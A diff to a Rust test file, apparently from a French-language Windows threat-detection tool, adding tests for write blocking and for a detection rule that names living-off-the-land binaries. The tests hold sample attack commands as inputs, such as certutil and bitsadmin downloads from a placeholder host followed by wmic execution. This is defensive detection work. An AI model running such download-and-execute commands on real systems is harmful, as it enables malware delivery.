@@ -8655,13 +8655,31 @@ fn audit_p2_copie_de_cote_jamais_ecrasee() {
     assert!(src.contains("if NON_CHARGE.load("));
 }
 
+/// Suivi de #255 et #258 : renommage en échec bloque les écritures ; réponse d'une exception en mémoire seulement ;
+/// code de comportement de PRC-003 qui nomme chaque outil vu
+#[test]
+fn suivi_255_258_remarques() {
+    let src = include_str!("apprentissage.rs");
+    let i = src.find("ecrire_au_demarrage = r.is_ok();").expect("renommage");
+    assert!(src[i..i + 400].contains("NON_CHARGE.store(true"), "renommage en échec sans blocage des écritures");
+    use crate::apprentissage::reponse_exception;
+    assert_eq!(reponse_exception("a.exe", false), "a.exe");
+    assert!(reponse_exception("a.exe", true).contains("perdue au redémarrage"));
+    assert!(include_str!("moniteur.rs").contains("apprentissage_non_charge: crate::apprentissage::non_charge()"));
+    use crate::processus::code_comportement;
+    use crate::regles::PRC_003;
+    let deux = "cmd /c certutil -urlcache -f http://x/a.exe a.exe & wmic process call create a.exe";
+    assert_eq!(code_comportement(false, &[PRC_003], deux), "PRC-003:certutil,wmic");
+    assert_ne!(code_comportement(false, &[PRC_003], deux), code_comportement(false, &[PRC_003], "certutil -urlcache -f http://x/a.exe a.exe"));
+}
+
 /// Revue de l'auditeur du 2026-11-22, point 2 : codes de comportement posés par les producteurs
 #[test]
 fn audit_p2_codes_producteurs() {
-    use crate::processus::{code_comportement, outil_lolbin};
+    use crate::processus::{code_comportement, outils_lolbin};
     use crate::regles::{PRC_001, PRC_003};
-    assert_eq!(outil_lolbin("CertUtil.exe -urlcache -f http://x/y"), "certutil");
-    assert_eq!(outil_lolbin("notepad.exe"), "");
+    assert_eq!(outils_lolbin("CertUtil.exe -urlcache -f http://x/y"), ["certutil"]);
+    assert!(outils_lolbin("notepad.exe").is_empty());
     assert_eq!(code_comportement(false, &[PRC_003], r"bitsadmin /transfer j http://x c:\y"), "PRC-003:bitsadmin");
     assert_eq!(code_comportement(true, &[PRC_003, PRC_001, PRC_003], "certutil -decode a b"), format!("document+{PRC_001}+PRC-003:certutil"));
     use crate::persistance::type_entree;
